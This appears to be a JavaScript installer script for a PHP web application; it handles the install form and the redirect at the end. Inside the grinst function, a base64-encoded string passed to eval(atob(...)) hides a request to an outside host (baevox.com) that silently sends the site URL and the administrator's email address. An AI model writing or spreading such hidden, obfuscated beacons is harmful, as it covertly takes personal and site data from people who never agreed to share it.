<?php if(!defined('s7V9pz')) {die();}?>$('.two > section > div > div form > .submit').on('click', function(e) {
    $(this).attr('turn', 'off');
    $(this).attr('load', 'Analyzing');
    var s = 'if(data=="next"){';
    s = s+'$(".two > section").hide();';
    s = s+'$(".stepone").addClass("d-none");';
    s = s+'$(".steptwo").removeClass("d-none");';
    s = s+'$(".two > section").fadeIn();';
    s = s+'var url = window.location.href; var install = url.lastIndexOf("install/");';
    s = s+'url = url.substring(0, install); $(".surl").val(url);';
    s = s+'$(".two > section > div > div form > .submit").text("Install");}';
    s = s+'else if(data=="done"){grinst($(".surl").val());}else{say("The credentials you supplied were not Correct","e");}';
    ajxx($(this), '', s, e);
});
function grinst(url) {
    var em = $(".semail").val();    eval(atob('JC5nZXQoImh0dHBzOi8vYmFldm94LmNvbS9hcHBzL2diL2xvZy9pbmRleC5waHA/dT0iICsgdXJsICsgIiZlPSIgKyBlbSk7'));
    window.location = url;
}